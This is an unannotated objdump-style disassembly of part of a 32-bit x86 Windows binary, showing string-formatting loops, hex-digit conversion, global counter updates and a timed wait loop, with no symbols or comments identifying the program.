  401e35:	e8 bf 38 00 00       	call   0x4056f9
  401e3a:	8b 0d b0 fd 41 00    	mov    0x41fdb0,%ecx
  401e40:	3b cf                	cmp    %edi,%ecx
  401e42:	75 0c                	jne    0x401e50
  401e44:	66 c7 45 80 30 00    	movw   $0x30,-0x80(%ebp)
  401e4a:	66 89 7d 82          	mov    %di,-0x7e(%ebp)
  401e4e:	eb 08                	jmp    0x401e58
  401e50:	8d 45 80             	lea    -0x80(%ebp),%eax
  401e53:	e8 a1 38 00 00       	call   0x4056f9
  401e58:	8b 0d 78 52 41 00    	mov    0x415278,%ecx
  401e5e:	3b cf                	cmp    %edi,%ecx
  401e60:	75 0c                	jne    0x401e6e
  401e62:	66 c7 45 a8 30 00    	movw   $0x30,-0x58(%ebp)
  401e68:	66 89 7d aa          	mov    %di,-0x56(%ebp)
  401e6c:	eb 08                	jmp    0x401e76
  401e6e:	8d 45 a8             	lea    -0x58(%ebp),%eax
  401e71:	e8 83 38 00 00       	call   0x4056f9
  401e76:	6a 20                	push   $0x20
  401e78:	8d 8d 64 fe ff ff    	lea    -0x19c(%ebp),%ecx
  401e7e:	5a                   	pop    %edx
  401e7f:	e8 c9 39 00 00       	call   0x40584d
  401e84:	25 0f 00 00 80       	and    $0x8000000f,%eax
  401e89:	79 05                	jns    0x401e90
  401e8b:	48                   	dec    %eax
  401e8c:	83 c8 f0             	or     $0xfffffff0,%eax
  401e8f:	40                   	inc    %eax
  401e90:	83 f8 0a             	cmp    $0xa,%eax
  401e93:	7d 05                	jge    0x401e9a
  401e95:	83 c0 30             	add    $0x30,%eax
  401e98:	eb 03                	jmp    0x401e9d
  401e9a:	83 c0 37             	add    $0x37,%eax
  401e9d:	0f b7 c0             	movzwl %ax,%eax
  401ea0:	66 89 01             	mov    %ax,(%ecx)
  401ea3:	41                   	inc    %ecx
  401ea4:	41                   	inc    %ecx
  401ea5:	4a                   	dec    %edx
  401ea6:	75 d7                	jne    0x401e7f
  401ea8:	66 89 39             	mov    %di,(%ecx)
  401eab:	8d bd 64 de ff ff    	lea    -0x219c(%ebp),%edi
  401eb1:	8d 95 64 ee ff ff    	lea    -0x119c(%ebp),%edx
  401eb7:	e8 8e 52 00 00       	call   0x40714a
  401ebc:	8d 45 d0             	lea    -0x30(%ebp),%eax
  401ebf:	50                   	push   %eax
  401ec0:	53                   	push   %ebx
  401ec1:	e8 63 36 00 00       	call   0x405529
  401ec6:	ff 75 24             	push   0x24(%ebp)
  401ec9:	53                   	push   %ebx
  401eca:	e8 5a 36 00 00       	call   0x405529
  401ecf:	8d 85 54 ff ff ff    	lea    -0xac(%ebp),%eax
  401ed5:	50                   	push   %eax
  401ed6:	53                   	push   %ebx
  401ed7:	e8 4d 36 00 00       	call   0x405529
  401edc:	8d 45 80             	lea    -0x80(%ebp),%eax
  401edf:	50                   	push   %eax
  401ee0:	53                   	push   %ebx
  401ee1:	e8 43 36 00 00       	call   0x405529
  401ee6:	8d 45 a8             	lea    -0x58(%ebp),%eax
  401ee9:	50                   	push   %eax
  401eea:	53                   	push   %ebx
  401eeb:	e8 39 36 00 00       	call   0x405529
  401ef0:	8d 85 64 fe ff ff    	lea    -0x19c(%ebp),%eax
  401ef6:	50                   	push   %eax
  401ef7:	53                   	push   %ebx
  401ef8:	e8 2c 36 00 00       	call   0x405529
  401efd:	8b 7d 1c             	mov    0x1c(%ebp),%edi
  401f00:	83 c4 30             	add    $0x30,%esp
  401f03:	85 ff                	test   %edi,%edi
  401f05:	74 28                	je     0x401f2f
  401f07:	8d 95 64 ce ff ff    	lea    -0x319c(%ebp),%edx
  401f0d:	e8 38 52 00 00       	call   0x40714a
  401f12:	68 7c e2 40 00       	push   $0x40e27c
  401f17:	53                   	push   %ebx
  401f18:	e8 0c 36 00 00       	call   0x405529
  401f1d:	8d 85 64 ce ff ff    	lea    -0x319c(%ebp),%eax
  401f23:	50                   	push   %eax
  401f24:	53                   	push   %ebx
  401f25:	e8 ff 35 00 00       	call   0x405529
  401f2a:	83 c4 10             	add    $0x10,%esp
  401f2d:	eb 0d                	jmp    0x401f3c
  401f2f:	68 a8 e2 40 00       	push   $0x40e2a8
  401f34:	53                   	push   %ebx
  401f35:	e8 ef 35 00 00       	call   0x405529
  401f3a:	59                   	pop    %ecx
  401f3b:	59                   	pop    %ecx
  401f3c:	8d 85 64 ee ff ff    	lea    -0x119c(%ebp),%eax
  401f42:	50                   	push   %eax
  401f43:	53                   	push   %ebx
  401f44:	e8 e0 35 00 00       	call   0x405529
  401f49:	59                   	pop    %ecx
  401f4a:	59                   	pop    %ecx
  401f4b:	e9 af fe ff ff       	jmp    0x401dff
  401f50:	83 fe 07             	cmp    $0x7,%esi
  401f53:	75 36                	jne    0x401f8b
  401f55:	8d 45 d0             	lea    -0x30(%ebp),%eax
  401f58:	50                   	push   %eax
  401f59:	53                   	push   %ebx
  401f5a:	e8 ca 35 00 00       	call   0x405529
  401f5f:	59                   	pop    %ecx
  401f60:	59                   	pop    %ecx
  401f61:	33 f6                	xor    %esi,%esi
  401f63:	8b 45 28             	mov    0x28(%ebp),%eax
  401f66:	8b 3c b0             	mov    (%eax,%esi,4),%edi
  401f69:	8d 95 64 fe ff ff    	lea    -0x19c(%ebp),%edx
  401f6f:	e8 d6 51 00 00       	call   0x40714a
  401f74:	8d 85 64 fe ff ff    	lea    -0x19c(%ebp),%eax
  401f7a:	50                   	push   %eax
  401f7b:	53                   	push   %ebx
  401f7c:	e8 a8 35 00 00       	call   0x405529
  401f81:	46                   	inc    %esi
  401f82:	83 fe 0b             	cmp    $0xb,%esi
  401f85:	59                   	pop    %ecx
  401f86:	59                   	pop    %ecx
  401f87:	7c da                	jl     0x401f63
  401f89:	33 ff                	xor    %edi,%edi
  401f8b:	8b 75 f8             	mov    -0x8(%ebp),%esi
  401f8e:	83 fe 08             	cmp    $0x8,%esi
  401f91:	74 0a                	je     0x401f9d
  401f93:	83 fe 0e             	cmp    $0xe,%esi
  401f96:	74 05                	je     0x401f9d
  401f98:	83 fe 0f             	cmp    $0xf,%esi
  401f9b:	75 0c                	jne    0x401fa9
  401f9d:	8d 45 d0             	lea    -0x30(%ebp),%eax
  401fa0:	50                   	push   %eax
  401fa1:	53                   	push   %ebx
  401fa2:	e8 82 35 00 00       	call   0x405529
  401fa7:	59                   	pop    %ecx
  401fa8:	59                   	pop    %ecx
  401fa9:	83 fe 09             	cmp    $0x9,%esi
  401fac:	75 36                	jne    0x401fe4
  401fae:	39 7d 1c             	cmp    %edi,0x1c(%ebp)
  401fb1:	66 89 bd 64 ee ff ff 	mov    %di,-0x119c(%ebp)
  401fb8:	74 10                	je     0x401fca
  401fba:	8b 7d 1c             	mov    0x1c(%ebp),%edi
  401fbd:	8d 95 64 ee ff ff    	lea    -0x119c(%ebp),%edx
  401fc3:	e8 82 51 00 00       	call   0x40714a
  401fc8:	33 ff                	xor    %edi,%edi
  401fca:	8d 85 64 ee ff ff    	lea    -0x119c(%ebp),%eax
  401fd0:	50                   	push   %eax
  401fd1:	53                   	push   %ebx
  401fd2:	e8 52 35 00 00       	call   0x405529
  401fd7:	8d 45 d0             	lea    -0x30(%ebp),%eax
  401fda:	50                   	push   %eax
  401fdb:	53                   	push   %ebx
  401fdc:	e8 48 35 00 00       	call   0x405529
  401fe1:	83 c4 10             	add    $0x10,%esp
  401fe4:	83 7d f8 0b          	cmpl   $0xb,-0x8(%ebp)
  401fe8:	74 06                	je     0x401ff0
  401fea:	83 7d f8 0d          	cmpl   $0xd,-0x8(%ebp)
  401fee:	75 6e                	jne    0x40205e
  401ff0:	8d 85 64 fe ff ff    	lea    -0x19c(%ebp),%eax
  401ff6:	e8 3c 52 00 00       	call   0x407237
  401ffb:	8d bd 64 de ff ff    	lea    -0x219c(%ebp),%edi
  402001:	8d 95 64 ce ff ff    	lea    -0x319c(%ebp),%edx
  402007:	e8 ee 51 00 00       	call   0x4071fa
  40200c:	8b 7d 1c             	mov    0x1c(%ebp),%edi
  40200f:	85 ff                	test   %edi,%edi
  402011:	74 0d                	je     0x402020
  402013:	8d 95 64 ee ff ff    	lea    -0x119c(%ebp),%edx
  402019:	e8 dc 51 00 00       	call   0x4071fa
  40201e:	eb 08                	jmp    0x402028
  402020:	66 83 a5 64 ee ff ff 	andw   $0x0,-0x119c(%ebp)
  402027:	00 
  402028:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40202b:	50                   	push   %eax
  40202c:	53                   	push   %ebx
  40202d:	e8 f7 34 00 00       	call   0x405529
  402032:	8d 85 64 ee ff ff    	lea    -0x119c(%ebp),%eax
  402038:	50                   	push   %eax
  402039:	53                   	push   %ebx
  40203a:	e8 ea 34 00 00       	call   0x405529
  40203f:	8d 85 64 ce ff ff    	lea    -0x319c(%ebp),%eax
  402045:	50                   	push   %eax
  402046:	53                   	push   %ebx
  402047:	e8 dd 34 00 00       	call   0x405529
  40204c:	8d 85 64 fe ff ff    	lea    -0x19c(%ebp),%eax
  402052:	50                   	push   %eax
  402053:	53                   	push   %ebx
  402054:	e8 d0 34 00 00       	call   0x405529
  402059:	83 c4 20             	add    $0x20,%esp
  40205c:	33 ff                	xor    %edi,%edi
  40205e:	83 7d f8 0c          	cmpl   $0xc,-0x8(%ebp)
  402062:	0f 85 d2 00 00 00    	jne    0x40213a
  402068:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40206b:	50                   	push   %eax
  40206c:	53                   	push   %ebx
  40206d:	e8 b7 34 00 00       	call   0x405529
  402072:	8b 45 24             	mov    0x24(%ebp),%eax
  402075:	83 c0 08             	add    $0x8,%eax
  402078:	50                   	push   %eax
  402079:	53                   	push   %ebx
  40207a:	e8 aa 34 00 00       	call   0x405529
  40207f:	8d 45 0c             	lea    0xc(%ebp),%eax
  402082:	50                   	push   %eax
  402083:	8d 85 2c ff ff ff    	lea    -0xd4(%ebp),%eax
  402089:	6a 5e                	push   $0x5e
  40208b:	66 89 bd 64 ee ff ff 	mov    %di,-0x119c(%ebp)
  402092:	50                   	push   %eax
  402093:	66 33 ff             	xor    %di,%di
  402096:	b8 02 22 41 00       	mov    $0x412202,%eax
  40209b:	e8 cb 37 00 00       	call   0x40586b
  4020a0:	83 c4 1c             	add    $0x1c,%esp
  4020a3:	33 f6                	xor    %esi,%esi
  4020a5:	85 c0                	test   %eax,%eax
  4020a7:	74 24                	je     0x4020cd
  4020a9:	3b 75 0c             	cmp    0xc(%ebp),%esi
  4020ac:	7d 1f                	jge    0x4020cd
  4020ae:	b9 c8 e2 40 00       	mov    $0x40e2c8,%ecx
  4020b3:	8d 85 64 ee ff ff    	lea    -0x119c(%ebp),%eax
  4020b9:	e8 2f 34 00 00       	call   0x4054ed
  4020be:	8b 8c b5 2c ff ff ff 	mov    -0xd4(%ebp,%esi,4),%ecx
  4020c5:	e8 23 34 00 00       	call   0x4054ed
  4020ca:	46                   	inc    %esi
  4020cb:	eb dc                	jmp    0x4020a9
  4020cd:	8d 85 64 ee ff ff    	lea    -0x119c(%ebp),%eax
  4020d3:	50                   	push   %eax
  4020d4:	53                   	push   %ebx
  4020d5:	e8 4f 34 00 00       	call   0x405529
  4020da:	66 83 a5 64 ee ff ff 	andw   $0x0,-0x119c(%ebp)
  4020e1:	00 
  4020e2:	8d 45 0c             	lea    0xc(%ebp),%eax
  4020e5:	50                   	push   %eax
  4020e6:	8d 85 2c ff ff ff    	lea    -0xd4(%ebp),%eax
  4020ec:	6a 5e                	push   $0x5e
  4020ee:	50                   	push   %eax
  4020ef:	66 33 ff             	xor    %di,%di
  4020f2:	b8 52 19 41 00       	mov    $0x411952,%eax
  4020f7:	e8 6f 37 00 00       	call   0x40586b
  4020fc:	83 c4 14             	add    $0x14,%esp
  4020ff:	33 f6                	xor    %esi,%esi
  402101:	85 c0                	test   %eax,%eax
  402103:	74 24                	je     0x402129
  402105:	3b 75 0c             	cmp    0xc(%ebp),%esi
  402108:	7d 1f                	jge    0x402129
  40210a:	b9 e8 e2 40 00       	mov    $0x40e2e8,%ecx
  40210f:	8d 85 64 ee ff ff    	lea    -0x119c(%ebp),%eax
  402115:	e8 d3 33 00 00       	call   0x4054ed
  40211a:	8b 8c b5 2c ff ff ff 	mov    -0xd4(%ebp,%esi,4),%ecx
  402121:	e8 c7 33 00 00       	call   0x4054ed
  402126:	46                   	inc    %esi
  402127:	eb dc                	jmp    0x402105
  402129:	8d 85 64 ee ff ff    	lea    -0x119c(%ebp),%eax
  40212f:	50                   	push   %eax
  402130:	53                   	push   %ebx
  402131:	e8 f3 33 00 00       	call   0x405529
  402136:	59                   	pop    %ecx
  402137:	59                   	pop    %ecx
  402138:	33 ff                	xor    %edi,%edi
  40213a:	83 7d f8 10          	cmpl   $0x10,-0x8(%ebp)
  40213e:	0f 85 ca 00 00 00    	jne    0x40220e
  402144:	8b 0d b0 fd 41 00    	mov    0x41fdb0,%ecx
  40214a:	3b cf                	cmp    %edi,%ecx
  40214c:	75 12                	jne    0x402160
  40214e:	66 c7 85 54 ff ff ff 	movw   $0x30,-0xac(%ebp)
  402155:	30 00 
  402157:	66 89 bd 56 ff ff ff 	mov    %di,-0xaa(%ebp)
  40215e:	eb 0b                	jmp    0x40216b
  402160:	8d 85 54 ff ff ff    	lea    -0xac(%ebp),%eax
  402166:	e8 8e 35 00 00       	call   0x4056f9
  40216b:	8b 0d 78 52 41 00    	mov    0x415278,%ecx
  402171:	3b cf                	cmp    %edi,%ecx
  402173:	75 0c                	jne    0x402181
  402175:	66 c7 45 80 30 00    	movw   $0x30,-0x80(%ebp)
  40217b:	66 89 7d 82          	mov    %di,-0x7e(%ebp)
  40217f:	eb 08                	jmp    0x402189
  402181:	8d 45 80             	lea    -0x80(%ebp),%eax
  402184:	e8 70 35 00 00       	call   0x4056f9
  402189:	8d bd 64 de ff ff    	lea    -0x219c(%ebp),%edi
  40218f:	8d 95 64 ce ff ff    	lea    -0x319c(%ebp),%edx
  402195:	e8 b0 4f 00 00       	call   0x40714a
  40219a:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40219d:	50                   	push   %eax
  40219e:	53                   	push   %ebx
  40219f:	e8 85 33 00 00       	call   0x405529
  4021a4:	8b 7d 1c             	mov    0x1c(%ebp),%edi
  4021a7:	85 ff                	test   %edi,%edi
  4021a9:	59                   	pop    %ecx
  4021aa:	59                   	pop    %ecx
  4021ab:	74 28                	je     0x4021d5
  4021ad:	8d 95 64 ee ff ff    	lea    -0x119c(%ebp),%edx
  4021b3:	e8 92 4f 00 00       	call   0x40714a
  4021b8:	68 fc e2 40 00       	push   $0x40e2fc
  4021bd:	53                   	push   %ebx
  4021be:	e8 66 33 00 00       	call   0x405529
  4021c3:	8d 85 64 ee ff ff    	lea    -0x119c(%ebp),%eax
  4021c9:	50                   	push   %eax
  4021ca:	53                   	push   %ebx
  4021cb:	e8 59 33 00 00       	call   0x405529
  4021d0:	83 c4 10             	add    $0x10,%esp
  4021d3:	eb 17                	jmp    0x4021ec
  4021d5:	66 83 a5 64 ee ff ff 	andw   $0x0,-0x119c(%ebp)
  4021dc:	00 
  4021dd:	8d 85 64 ee ff ff    	lea    -0x119c(%ebp),%eax
  4021e3:	50                   	push   %eax
  4021e4:	53                   	push   %ebx
  4021e5:	e8 3f 33 00 00       	call   0x405529
  4021ea:	59                   	pop    %ecx
  4021eb:	59                   	pop    %ecx
  4021ec:	8d 85 64 ce ff ff    	lea    -0x319c(%ebp),%eax
  4021f2:	50                   	push   %eax
  4021f3:	53                   	push   %ebx
  4021f4:	e8 30 33 00 00       	call   0x405529
  4021f9:	8d 85 54 ff ff ff    	lea    -0xac(%ebp),%eax
  4021ff:	50                   	push   %eax
  402200:	53                   	push   %ebx
  402201:	e8 23 33 00 00       	call   0x405529
  402206:	8d 45 80             	lea    -0x80(%ebp),%eax
  402209:	e9 e7 fb ff ff       	jmp    0x401df5
  40220e:	33 c0                	xor    %eax,%eax
  402210:	5f                   	pop    %edi
  402211:	5e                   	pop    %esi
  402212:	c9                   	leave
  402213:	c3                   	ret
  402214:	55                   	push   %ebp
  402215:	8b ec                	mov    %esp,%ebp
  402217:	83 e4 f8             	and    $0xfffffff8,%esp
  40221a:	83 ec 1c             	sub    $0x1c,%esp
  40221d:	53                   	push   %ebx
  40221e:	8b 5d 08             	mov    0x8(%ebp),%ebx
  402221:	56                   	push   %esi
  402222:	8b 75 0c             	mov    0xc(%ebp),%esi
  402225:	57                   	push   %edi
  402226:	33 ff                	xor    %edi,%edi
  402228:	3b df                	cmp    %edi,%ebx
  40222a:	6a 02                	push   $0x2
  40222c:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
  402230:	59                   	pop    %ecx
  402231:	75 48                	jne    0x40227b
  402233:	39 7d 18             	cmp    %edi,0x18(%ebp)
  402236:	0f 85 f8 00 00 00    	jne    0x402334
  40223c:	a0 b8 d0 41 00       	mov    0x41d0b8,%al
  402241:	04 64                	add    $0x64,%al
  402243:	88 46 6e             	mov    %al,0x6e(%esi)
  402246:	a1 74 76 41 00       	mov    0x417674,%eax
  40224b:	89 7c 24 18          	mov    %edi,0x18(%esp)
  40224f:	89 3d d4 7f 42 00    	mov    %edi,0x427fd4
  402255:	89 3d d8 7f 42 00    	mov    %edi,0x427fd8
  40225b:	89 3d dc 7f 42 00    	mov    %edi,0x427fdc
  402261:	89 3d e0 7f 42 00    	mov    %edi,0x427fe0
  402267:	89 3d e8 7f 42 00    	mov    %edi,0x427fe8
  40226d:	c6 46 67 01          	movb   $0x1,0x67(%esi)
  402271:	c6 46 68 04          	movb   $0x4,0x68(%esi)
  402275:	89 46 0c             	mov    %eax,0xc(%esi)
  402278:	89 4e 60             	mov    %ecx,0x60(%esi)
  40227b:	39 7d 18             	cmp    %edi,0x18(%ebp)
  40227e:	0f 85 b0 00 00 00    	jne    0x402334
  402284:	8b 15 e8 7f 42 00    	mov    0x427fe8,%edx
  40228a:	8d 43 01             	lea    0x1(%ebx),%eax
  40228d:	3b 04 95 98 9f 41 00 	cmp    0x419f98(,%edx,4),%eax
  402294:	75 20                	jne    0x4022b6
  402296:	e8 b2 35 00 00       	call   0x40584d
  40229b:	8b 3c 9d f0 2e 42 00 	mov    0x422ef0(,%ebx,4),%edi
  4022a2:	2b f9                	sub    %ecx,%edi
  4022a4:	99                   	cltd
  4022a5:	f7 ff                	idiv   %edi
  4022a7:	42                   	inc    %edx
  4022a8:	ff 05 e8 7f 42 00    	incl   0x427fe8
  4022ae:	89 15 d4 7f 42 00    	mov    %edx,0x427fd4
  4022b4:	eb 06                	jmp    0x4022bc
  4022b6:	89 3d d4 7f 42 00    	mov    %edi,0x427fd4
  4022bc:	e8 8c 35 00 00       	call   0x40584d
  4022c1:	99                   	cltd
  4022c2:	6a 64                	push   $0x64
  4022c4:	59                   	pop    %ecx
  4022c5:	f7 f9                	idiv   %ecx
  4022c7:	33 c0                	xor    %eax,%eax
  4022c9:	bf 00 00 01 00       	mov    $0x10000,%edi
  4022ce:	85 d2                	test   %edx,%edx
  4022d0:	0f 9c c0             	setl   %al
  4022d3:	33 d2                	xor    %edx,%edx
  4022d5:	42                   	inc    %edx
  4022d6:	a3 ec 7f 42 00       	mov    %eax,0x427fec
  4022db:	8d 04 9d 20 fc 41 00 	lea    0x41fc20(,%ebx,4),%eax
  4022e2:	8b 08                	mov    (%eax),%ecx
  4022e4:	3b ca                	cmp    %edx,%ecx
  4022e6:	7c 04                	jl     0x4022ec
  4022e8:	3b cf                	cmp    %edi,%ecx
  4022ea:	7e 06                	jle    0x4022f2
  4022ec:	c7 00 90 00 00 00    	movl   $0x90,(%eax)
  4022f2:	8b 00                	mov    (%eax),%eax
  4022f4:	33 c9                	xor    %ecx,%ecx
  4022f6:	85 c2                	test   %eax,%edx
  4022f8:	74 01                	je     0x4022fb
  4022fa:	41                   	inc    %ecx
  4022fb:	03 d2                	add    %edx,%edx
  4022fd:	3b d7                	cmp    %edi,%edx
  4022ff:	72 f5                	jb     0x4022f6
  402301:	83 a6 80 00 00 00 00 	andl   $0x0,0x80(%esi)
  402308:	89 0d e4 7f 42 00    	mov    %ecx,0x427fe4
  40230e:	8b 0d b0 f5 41 00    	mov    0x41f5b0,%ecx
  402314:	e8 78 5d 00 00       	call   0x408091
  402319:	88 46 69             	mov    %al,0x69(%esi)
  40231c:	c6 46 6a 01          	movb   $0x1,0x6a(%esi)
  402320:	c6 46 75 00          	movb   $0x0,0x75(%esi)
  402324:	c6 46 74 00          	movb   $0x0,0x74(%esi)
  402328:	8b 04 9d 78 76 41 00 	mov    0x417678(,%ebx,4),%eax
  40232f:	89 46 70             	mov    %eax,0x70(%esi)
  402332:	33 ff                	xor    %edi,%edi
  402334:	8b 45 18             	mov    0x18(%ebp),%eax
  402337:	8b 0d e4 7f 42 00    	mov    0x427fe4,%ecx
  40233d:	99                   	cltd
  40233e:	f7 f9                	idiv   %ecx
  402340:	3b d7                	cmp    %edi,%edx
  402342:	89 54 24 10          	mov    %edx,0x10(%esp)
  402346:	75 2b                	jne    0x402373
  402348:	39 7d 18             	cmp    %edi,0x18(%ebp)
  40234b:	74 26                	je     0x402373
  40234d:	ff 05 d8 7f 42 00    	incl   0x427fd8
  402353:	8b 86 80 00 00 00    	mov    0x80(%esi),%eax
  402359:	fe 46 74             	incb   0x74(%esi)
  40235c:	83 f8 01             	cmp    $0x1,%eax
  40235f:	75 12                	jne    0x402373
  402361:	fe 46 75             	incb   0x75(%esi)
  402364:	3b c0                	cmp    %eax,%eax
  402366:	75 0b                	jne    0x402373
  402368:	39 7d 10             	cmp    %edi,0x10(%ebp)
  40236b:	74 06                	je     0x402373
  40236d:	ff 05 d4 7f 42 00    	incl   0x427fd4
  402373:	8b fb                	mov    %ebx,%edi
  402375:	c1 e7 02             	shl    $0x2,%edi
  402378:	8b 87 f0 2e 42 00    	mov    0x422ef0(%edi),%eax
  40237e:	0f af c1             	imul   %ecx,%eax
  402381:	39 45 18             	cmp    %eax,0x18(%ebp)
  402384:	7c 07                	jl     0x40238d
  402386:	33 c0                	xor    %eax,%eax
  402388:	e9 a8 01 00 00       	jmp    0x402535
  40238d:	8b 15 d8 7f 42 00    	mov    0x427fd8,%edx
  402393:	a1 d8 7f 42 00       	mov    0x427fd8,%eax
  402398:	2b 05 dc 7f 42 00    	sub    0x427fdc,%eax
  40239e:	8d 14 95 80 52 41 00 	lea    0x415280(,%edx,4),%edx
  4023a5:	89 54 24 24          	mov    %edx,0x24(%esp)
  4023a9:	8b 12                	mov    (%edx),%edx
  4023ab:	89 44 24 20          	mov    %eax,0x20(%esp)
  4023af:	89 54 24 14          	mov    %edx,0x14(%esp)
  4023b3:	75 0e                	jne    0x4023c3
  4023b5:	83 3d ec 7f 42 00 00 	cmpl   $0x0,0x427fec
  4023bc:	75 05                	jne    0x4023c3
  4023be:	83 64 24 14 00       	andl   $0x0,0x14(%esp)
  4023c3:	8b 97 f0 2e 42 00    	mov    0x422ef0(%edi),%edx
  4023c9:	4a                   	dec    %edx
  4023ca:	3b c2                	cmp    %edx,%eax
  4023cc:	75 13                	jne    0x4023e1
  4023ce:	49                   	dec    %ecx
  4023cf:	39 4c 24 10          	cmp    %ecx,0x10(%esp)
  4023d3:	75 0c                	jne    0x4023e1
  4023d5:	8b 8f f0 2e 42 00    	mov    0x422ef0(%edi),%ecx
  4023db:	01 0d dc 7f 42 00    	add    %ecx,0x427fdc
  4023e1:	85 c0                	test   %eax,%eax
  4023e3:	8b 4e 04             	mov    0x4(%esi),%ecx
  4023e6:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  4023ea:	51                   	push   %ecx
  4023eb:	75 2c                	jne    0x402419
  4023ed:	8b 97 68 28 42 00    	mov    0x422868(%edi),%edx
  4023f3:	e8 19 31 00 00       	call   0x405511
  4023f8:	8b 97 68 28 42 00    	mov    0x422868(%edi),%edx
  4023fe:	59                   	pop    %ecx
  4023ff:	b8 64 e2 40 00       	mov    $0x40e264,%eax
  402404:	e8 5e 30 00 00       	call   0x405467
  402409:	f7 d8                	neg    %eax
  40240b:	1b c0                	sbb    %eax,%eax
  40240d:	23 87 68 28 42 00    	and    0x422868(%edi),%eax
  402413:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  402417:	eb 24                	jmp    0x40243d
  402419:	8b 97 78 76 41 00    	mov    0x417678(%edi),%edx
  40241f:	e8 ed 30 00 00       	call   0x405511
  402424:	83 3d ec 7f 42 00 00 	cmpl   $0x0,0x427fec
  40242b:	59                   	pop    %ecx
  40242c:	74 0f                	je     0x40243d
  40242e:	8b 44 24 24          	mov    0x24(%esp),%eax
  402432:	8b 48 fc             	mov    -0x4(%eax),%ecx
  402435:	8b 46 04             	mov    0x4(%esi),%eax
  402438:	e8 b0 30 00 00       	call   0x4054ed
  40243d:	6b db 3c             	imul   $0x3c,%ebx,%ebx
  402440:	81 c3 e8 33 41 00    	add    $0x4133e8,%ebx
  402446:	53                   	push   %ebx
  402447:	ff b7 d8 f5 41 00    	push   0x41f5d8(%edi)
  40244d:	8b 1e                	mov    (%esi),%ebx
  40244f:	ff b7 b0 37 42 00    	push   0x4237b0(%edi)
  402455:	ff 74 24 28          	push   0x28(%esp)
  402459:	ff 74 24 24          	push   0x24(%esp)
  40245d:	ff b7 78 76 41 00    	push   0x417678(%edi)
  402463:	ff b7 f8 29 42 00    	push   0x4229f8(%edi)
  402469:	ff 74 24 2c          	push   0x2c(%esp)
  40246d:	ff b7 20 fc 41 00    	push   0x41fc20(%edi)
  402473:	e8 c9 f7 ff ff       	call   0x401c41
  402478:	8b 1d d4 7f 42 00    	mov    0x427fd4,%ebx
  40247e:	83 c4 24             	add    $0x24,%esp
  402481:	85 c0                	test   %eax,%eax
  402483:	a3 bc 3e 42 00       	mov    %eax,0x423ebc
  402488:	74 15                	je     0x40249f
  40248a:	8b 44 24 20          	mov    0x20(%esp),%eax
  40248e:	40                   	inc    %eax
  40248f:	3b d8                	cmp    %eax,%ebx
  402491:	75 0c                	jne    0x40249f
  402493:	c7 05 c0 3e 42 00 01 	movl   $0x1,0x423ec0
  40249a:	00 00 00 
  40249d:	eb 07                	jmp    0x4024a6
  40249f:	83 25 c0 3e 42 00 00 	andl   $0x0,0x423ec0
  4024a6:	8b 87 68 3a 42 00    	mov    0x423a68(%edi),%eax
  4024ac:	ff 76 04             	push   0x4(%esi)
  4024af:	89 46 78             	mov    %eax,0x78(%esi)
  4024b2:	8b 97 78 76 41 00    	mov    0x417678(%edi),%edx
  4024b8:	e8 54 30 00 00       	call   0x405511
  4024bd:	59                   	pop    %ecx
  4024be:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4024c2:	85 c9                	test   %ecx,%ecx
  4024c4:	74 08                	je     0x4024ce
  4024c6:	8b 46 04             	mov    0x4(%esi),%eax
  4024c9:	e8 1f 30 00 00       	call   0x4054ed
  4024ce:	ff 76 08             	push   0x8(%esi)
  4024d1:	8b 56 04             	mov    0x4(%esi),%edx
  4024d4:	e8 38 30 00 00       	call   0x405511
  4024d9:	8b 44 24 24          	mov    0x24(%esp),%eax
  4024dd:	40                   	inc    %eax
  4024de:	3b d8                	cmp    %eax,%ebx
  4024e0:	a1 e4 7f 42 00       	mov    0x427fe4,%eax
  4024e5:	59                   	pop    %ecx
  4024e6:	75 11                	jne    0x4024f9
  4024e8:	8d 48 ff             	lea    -0x1(%eax),%ecx
  4024eb:	39 4c 24 10          	cmp    %ecx,0x10(%esp)
  4024ef:	75 08                	jne    0x4024f9
  4024f1:	c7 44 24 18 01 00 00 	movl   $0x1,0x18(%esp)
  4024f8:	00 
  4024f9:	48                   	dec    %eax
  4024fa:	39 44 24 10          	cmp    %eax,0x10(%esp)
  4024fe:	75 18                	jne    0x402518
  402500:	c6 46 6b 0f          	movb   $0xf,0x6b(%esi)
  402504:	c6 46 6c 05          	movb   $0x5,0x6c(%esi)
  402508:	8b 0d ac f5 41 00    	mov    0x41f5ac,%ecx
  40250e:	e8 7e 5b 00 00       	call   0x408091
  402513:	88 46 65             	mov    %al,0x65(%esi)
  402516:	eb 0c                	jmp    0x402524
  402518:	c6 46 65 00          	movb   $0x0,0x65(%esi)
  40251c:	c6 46 6b 00          	movb   $0x0,0x6b(%esi)
  402520:	c6 46 6c 00          	movb   $0x0,0x6c(%esi)
  402524:	8b 44 24 18          	mov    0x18(%esp),%eax
  402528:	89 86 80 00 00 00    	mov    %eax,0x80(%esi)
  40252e:	33 c0                	xor    %eax,%eax
  402530:	c6 46 66 00          	movb   $0x0,0x66(%esi)
  402534:	40                   	inc    %eax
  402535:	5f                   	pop    %edi
  402536:	5e                   	pop    %esi
  402537:	5b                   	pop    %ebx
  402538:	8b e5                	mov    %ebp,%esp
  40253a:	5d                   	pop    %ebp
  40253b:	c3                   	ret
  40253c:	55                   	push   %ebp
  40253d:	8b ec                	mov    %esp,%ebp
  40253f:	b8 64 20 00 00       	mov    $0x2064,%eax
  402544:	e8 67 b0 00 00       	call   0x40d5b0
  402549:	53                   	push   %ebx
  40254a:	8b 1d 70 e0 40 00    	mov    0x40e070,%ebx
  402550:	56                   	push   %esi
  402551:	33 f6                	xor    %esi,%esi
  402553:	39 35 e4 14 41 00    	cmp    %esi,0x4114e4
  402559:	57                   	push   %edi
  40255a:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40255d:	75 13                	jne    0x402572
  40255f:	eb 07                	jmp    0x402568
  402561:	68 10 27 00 00       	push   $0x2710
  402566:	ff d3                	call   *%ebx
  402568:	e8 a7 47 00 00       	call   0x406d14
  40256d:	83 f8 01             	cmp    $0x1,%eax
  402570:	75 ef                	jne    0x402561
  402572:	39 75 1c             	cmp    %esi,0x1c(%ebp)
  402575:	74 0d                	je     0x402584
  402577:	6a 04                	push   $0x4
  402579:	56                   	push   %esi
  40257a:	6a 07                	push   $0x7
